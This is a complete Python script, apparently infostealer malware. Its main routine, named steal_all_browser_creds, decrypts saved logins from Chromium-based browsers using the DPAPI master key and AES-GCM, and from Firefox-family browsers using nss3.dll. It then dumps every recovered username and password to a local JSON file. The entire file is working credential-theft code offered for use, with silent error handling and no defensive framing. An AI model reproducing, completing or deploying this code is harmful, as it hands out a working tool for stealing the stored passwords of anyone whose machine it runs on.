import os
import json
import base64
import sqlite3
import shutil
import re
from datetime import timezone, datetime, timedelta # timezone is not directly used but kept from original
import win32crypt # Part of pywin32
from Crypto.Cipher import AES # Part of pycryptodome

# --- Firefox NSS decryption setup ---
# Attempt to load nss3.dll for Firefox decryption
# This path might vary, so a flexible approach is needed.
# On Windows, it's typically in the Firefox installation directory
# or a system path if added.
_nss3_lib = None
try:
    import ctypes
    from ctypes.util import find_library

    # Common paths for nss3.dll
    nss3_paths = [
        os.path.join(os.getenv('PROGRAMFILES'), 'Mozilla Firefox', 'nss3.dll'),
        os.path.join(os.getenv('PROGRAMFILES(X86)'), 'Mozilla Firefox', 'nss3.dll'),
        find_library('nss3') # Fallback to default system search paths
    ]

    for lib_path in nss3_paths:
        if lib_path and os.path.exists(lib_path):
            try:
                _nss3_lib = ctypes.CDLL(lib_path)
                break
            except OSError:
                continue
    if _nss3_lib:
        # Define NSS specific types and functions if library loaded
        class SECItem(ctypes.Structure):
            _fields_ = [
                ('type', ctypes.c_uint),
                ('data', ctypes.c_char_p),
                ('len', ctypes.c_uint)
            ]

        # PK11SDR_Decrypt function signature
        _nss3_lib.PK11SDR_Decrypt.argtypes = [
            ctypes.POINTER(SECItem),
            ctypes.POINTER(SECItem),
            ctypes.c_void_p # Reserved, usually NULL
        ]
        _nss3_lib.PK11SDR_Decrypt.restype = ctypes.c_int # Returns 0 on success

        # NSS_Init function signature
        _nss3_lib.NSS_Init.argtypes = [ctypes.c_char_p] # Path to profile dir
        _nss3_lib.NSS_Init.restype = ctypes.c_int # Returns 0 on success

        # SECITEM_ZfreeItem function signature (for freeing allocated SECItems)
        _nss3_lib.SECITEM_ZfreeItem.argtypes = [ctypes.POINTER(SECItem), ctypes.c_int]
        _nss3_lib.SECITEM_ZfreeItem.restype = None

    else:
        print("Warning: nss3.dll not found or could not be loaded. Firefox password decryption will not work.")
except ImportError:
    print("Warning: ctypes or Crypto.Cipher not available. Some decryption features might be limited.")
except Exception as e:
    print(f"Warning: An unexpected error occurred during NSS library loading: {e}. Firefox decryption might be affected.")

# --- Utility Functions ---

def get_browser_base_paths():
    """Get base paths for all supported browsers."""
    appdata_local = os.getenv('LOCALAPPDATA')
    appdata_roaming = os.getenv('APPDATA')
    user_profile = os.getenv('USERPROFILE') # For older/alternative paths

    paths = {
        'Chrome': os.path.join(appdata_local, 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(appdata_local, 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        # Opera is often in Roaming and its Login Data is directly under 'Opera Stable'
        'Opera': os.path.join(appdata_roaming, 'Opera Software', 'Opera Stable'),
        'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
        'Yandex': os.path.join(appdata_local, 'Yandex', 'YandexBrowser', 'User Data'),
        'Chromium': os.path.join(appdata_local, 'Chromium', 'User Data'),
        # Firefox-based browsers store profiles under AppData/Roaming/Mozilla/Firefox/Profiles
        'Firefox': os.path.join(appdata_roaming, 'Mozilla', 'Firefox', 'Profiles'),
        'Waterfox': os.path.join(appdata_roaming, 'Waterfox', 'Profiles'),
        'PaleMoon': os.path.join(appdata_roaming, 'Moonchild Productions', 'Pale Moon', 'Profiles')
    }
    return paths

def get_firefox_profile_paths(browser_profiles_base_path):
    """Discover individual Firefox-like browser profile directories."""
    profiles = []
    if not os.path.exists(browser_profiles_base_path):
        return []

    for entry in os.listdir(browser_profiles_base_path):
        full_path = os.path.join(browser_profiles_base_path, entry)
        if os.path.isdir(full_path):
            # Look for common profile naming conventions or key files
            if re.match(r'^[a-zA-Z0-9]+\.default(?:-release)?$', entry) or \
               os.path.exists(os.path.join(full_path, 'logins.json')) or \
               os.path.exists(os.path.join(full_path, 'key4.db')):
                profiles.append(full_path)
    return profiles

def convert_chrome_timestamp(chromedate):
    """Converts Chrome's timestamp (microseconds since 1601-01-01) to a readable datetime."""
    # Chrome's empty or special timestamp for 'never' saved passwords
    if chromedate == 86400000000 or not chromedate:
        return "N/A"
    try:
        return str(datetime(1601, 1, 1) + timedelta(microseconds=chromedate))
    except Exception:
        return "N/A" # Return N/A on conversion error

def get_chrome_encryption_key(browser_main_path, browser_name="Unknown"):
    """
    Extracts the DPAPI-encrypted master key from a Chromium-based browser's Local State file.
    """
    local_state_paths = [
        os.path.join(browser_main_path, "Local State"), # Common for Opera
        os.path.join(browser_main_path, "Default", "Local State"), # Common for profile-based
        os.path.join(browser_main_path, "User Data", "Local State") # Fallback
    ]

    local_state_file_path = None
    for p in local_state_paths:
        if os.path.exists(p):
            local_state_file_path = p
            break

    if not local_state_file_path:
        # print(f"DEBUG: Local State file not found for {browser_name} in expected locations.")
        return None

    try:
        with open(local_state_file_path, "r", encoding="utf-8") as f:
            local_state_content = json.loads(f.read())
        
        encrypted_key_b64 = local_state_content.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            # print(f"DEBUG: 'encrypted_key' not found in Local State for {browser_name}.")
            return None

        encrypted_key = base64.b64decode(encrypted_key_b64)
        # Remove "DPAPI" prefix if present
        if encrypted_key.startswith(b'DPAPI'):
            encrypted_key = encrypted_key[5:]
        
        # Use win32crypt to decrypt the key
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        # print(f"DEBUG: Error getting encryption key for {browser_name}: {e}")
        return None

def decrypt_chrome_password(encrypted_password_bytes, key):
    """
    Decrypts a password from a Chromium-based browser using the provided key.
    Handles both AES-GCM (v10/v11 prefix) and older DPAPI encrypted formats.
    """
    if not encrypted_password_bytes or not key:
        return ""
    
    try:
        if encrypted_password_bytes.startswith(b'v10') or encrypted_password_bytes.startswith(b'v11'):
            # AES-GCM decryption (Chrome v80+)
            iv = encrypted_password_bytes[3:15] # Initialization Vector (12 bytes)
            ciphertext = encrypted_password_bytes[15:-16] # Ciphertext (last 16 bytes are auth tag)
            tag = encrypted_password_bytes[-16:] # Authentication Tag (16 bytes)

            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_bytes = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted_bytes.decode('utf-8')
        else:
            # DPAPI decryption (older versions or fallback)
            return win32crypt.CryptUnprotectData(encrypted_password_bytes, None, None, None, 0)[1].decode('utf-8')
    except Exception as e:
        # print(f"DEBUG: Chrome password decryption failed: {e}")
        return ""

def decrypt_firefox_password(encrypted_value_bytes, profile_path):
    """
    Decrypts Firefox passwords using the NSS library (nss3.dll/libnss3.so).
    Requires the NSS library to be loaded and initialized with the profile path.
    """
    if not _nss3_lib:
        # print("DEBUG: NSS library not loaded, cannot decrypt Firefox passwords.")
        return ""
    if not profile_path:
        # print("DEBUG: Firefox profile path not provided for decryption.")
        return ""
    if not encrypted_value_bytes:
        return ""

    try:
        # NSS_Init needs the path to the directory containing key4.db
        # This needs to be called to initialize the NSS module for the specific profile.
        # It's okay to call it multiple times, but it might print warnings to stderr.
        result_init = _nss3_lib.NSS_Init(profile_path.encode('utf-8'))
        if result_init != 0:
            # print(f"DEBUG: NSS_Init failed for profile {profile_path} with code {result_init}.")
            return ""

        # Create SECItem for encrypted data
        encrypted = SECItem(0, encrypted_value_bytes, len(encrypted_value_bytes))
        decrypted = SECItem(0, None, 0) # Output SECItem

        # Decrypt the data using PK11SDR_Decrypt
        if _nss3_lib.PK11SDR_Decrypt(ctypes.byref(encrypted), ctypes.byref(decrypted), None) == 0:
            # If decryption is successful, decrypted.data points to the result
            result_bytes = ctypes.string_at(decrypted.data, decrypted.len)
            # Free the memory allocated by NSS for the decrypted item
            _nss3_lib.SECITEM_ZfreeItem(ctypes.byref(decrypted), 0)
            return result_bytes.decode('utf-8', errors='ignore') # Use errors='ignore' for robustness
        return ""
    except Exception as e:
        # print(f"DEBUG: Firefox decryption failed for profile {profile_path}: {e}")
        return ""

def get_chromium_logins(browser_name, browser_base_path, encryption_key_bytes):
    """Extracts login credentials from a Chromium-based browser's Login Data database."""
    all_browser_data = {}
    
    # Common locations for Login Data DB relative to browser_base_path
    db_candidate_paths = [
        os.path.join(browser_base_path, "Default", "Login Data"),
        os.path.join(browser_base_path, "Login Data"), # For Opera direct
        os.path.join(browser_base_path, "Profile 1", "Login Data"), # For multi-profile users
        os.path.join(browser_base_path, "User Data", "Default", "Login Data"), # Fallback
    ]

    login_db_path = None
    for p in db_candidate_paths:
        if os.path.exists(p):
            login_db_path = p
            break
            
    if not login_db_path:
        # print(f"DEBUG: Login Data database not found for {browser_name} in expected locations.")
        return all_browser_data # Return empty if no DB found

    temp_db_path = os.path.join(os.getenv('TEMP'), f"temp_{browser_name.lower().replace(' ', '_')}_login_data.db")
    
    try:
        shutil.copyfile(login_db_path, temp_db_path)
    except (IOError, shutil.SameFileError) as e:
        # print(f"DEBUG: Could not copy Login Data for {browser_name}: {e}. Browser might be open.")
        return all_browser_data # Return empty if cannot copy (e.g., file locked)

    db_conn = None
    try:
        db_conn = sqlite3.connect(temp_db_path)
        cursor = db_conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        
        for row in cursor.fetchall():
            site_url, username, encrypted_password_bytes, date_created = row
            password = decrypt_chrome_password(encrypted_password_bytes, encryption_key_bytes)
            
            if username or password: # Only store if we have a username or a decrypted password
                if site_url not in all_browser_data:
                    all_browser_data[site_url] = []
                
                all_browser_data[site_url].append({
                    "browser": browser_name,
                    "username": username,
                    "password": password,
                    "date_created": convert_chrome_timestamp(date_created)
                })
                
    except sqlite3.Error as e:
        # print(f"DEBUG: SQLite error processing {browser_name} Login Data: {e}")
        pass # Suppress SQLite errors, as the temp file might be locked or corrupt
    except Exception as e:
        # print(f"DEBUG: An unexpected error occurred while processing {browser_name}: {e}")
        pass
    finally:
        if db_conn:
            db_conn.close()
        if os.path.exists(temp_db_path):
            try:
                os.remove(temp_db_path)
            except Exception:
                pass # Couldn't remove temp file, possibly still locked

    return all_browser_data

def get_firefox_logins(browser_name, profile_path):
    """Extracts login credentials from a Firefox-based browser profile."""
    profile_data = {}
    logins_json_path = os.path.join(profile_path, "logins.json")
    key_db_path = os.path.join(profile_path, "key4.db") # The key database

    if not os.path.exists(logins_json_path) or not os.path.exists(key_db_path):
        # print(f"DEBUG: Missing logins.json or key4.db for {browser_name} profile: {profile_path}")
        return profile_data # Return empty if key files are missing

    try:
        # Read the logins.json file
        with open(logins_json_path, "r", encoding="utf-8") as f:
            logins_data = json.load(f)
            
        for login_entry in logins_data.get("logins", []):
            hostname = login_entry.get("hostname", "")
            encrypted_username_b64 = login_entry.get("encryptedUsername", "")
            encrypted_password_b64 = login_entry.get("encryptedPassword", "")
            
            # Firefox stores encrypted data as base64 in logins.json
            encrypted_username_bytes = base64.b64decode(encrypted_username_b64) if encrypted_username_b64 else b''
            encrypted_password_bytes = base64.b64decode(encrypted_password_b64) if encrypted_password_b64 else b''

            username = decrypt_firefox_password(encrypted_username_bytes, profile_path)
            password = decrypt_firefox_password(encrypted_password_bytes, profile_path)
            
            if username or password:
                if hostname not in profile_data:
                    profile_data[hostname] = []
                            
                profile_data[hostname].append({
                    "browser": browser_name,
                    "profile_name": os.path.basename(profile_path), # Add profile context
                    "username": username,
                    "password": password,
                    "date_created": "N/A" # Firefox logins.json doesn't store creation date directly
                })
                
    except json.JSONDecodeError as e:
        # print(f"DEBUG: Error decoding logins.json for {browser_name} profile {profile_path}: {e}")
        pass # Corrupt JSON file
    except Exception as e:
        # print(f"DEBUG: An unexpected error occurred while processing {browser_name} profile {profile_path}: {e}")
        pass
                
    return profile_data

# --- Main Execution Function ---

def steal_all_browser_creds():
    """Main function to extract passwords from all supported browsers."""
    all_collected_credentials = {}
    browser_base_paths = get_browser_base_paths()
    
    for browser_name, base_path in browser_base_paths.items():
        if not os.path.exists(base_path):
            # print(f"DEBUG: Base path for {browser_name} not found: {base_path}")
            continue # Skip if the browser's base directory doesn't exist
            
        # print(f"INFO: Attempting to process {browser_name}...")
        
        if browser_name in ['Firefox', 'Waterfox', 'PaleMoon']:
            # Handle Firefox-based browsers (which have multiple profiles)
            profiles = get_firefox_profile_paths(base_path)
            if not profiles:
                # print(f"DEBUG: No profiles found for {browser_name} at {base_path}")
                continue
            
            for profile_path in profiles:
                # print(f"INFO: Processing {browser_name} profile: {os.path.basename(profile_path)}")
                profile_creds = get_firefox_logins(browser_name, profile_path)
                if profile_creds:
                    # Store Firefox data under a key that includes the profile name
                    key = f"{browser_name} ({os.path.basename(profile_path)})"
                    all_collected_credentials[key] = profile_creds
        else:
            # Handle Chromium-based browsers (single encryption key per browser install)
            encryption_key_bytes = get_chrome_encryption_key(base_path, browser_name)
            if not encryption_key_bytes:
                # print(f"DEBUG: Could not retrieve encryption key for {browser_name}. Skipping.")
                continue
                
            browser_creds = get_chromium_logins(browser_name, base_path, encryption_key_bytes)
            if browser_creds:
                all_collected_credentials[browser_name] = browser_creds
                
    return all_collected_credentials

if __name__ == "__main__":
    extracted_credentials = steal_all_browser_creds()
    output_filename = "all_browser_passwords.json"
    
    if extracted_credentials:
        with open(output_filename, "w", encoding="utf-8") as f:
            json.dump(extracted_credentials, f, indent=4, ensure_ascii=False)
        print(f"\n[+] All discovered browser passwords extracted and saved to {output_filename}")
    else:
        print("\n[!] No browser credentials found from any supported browser.")
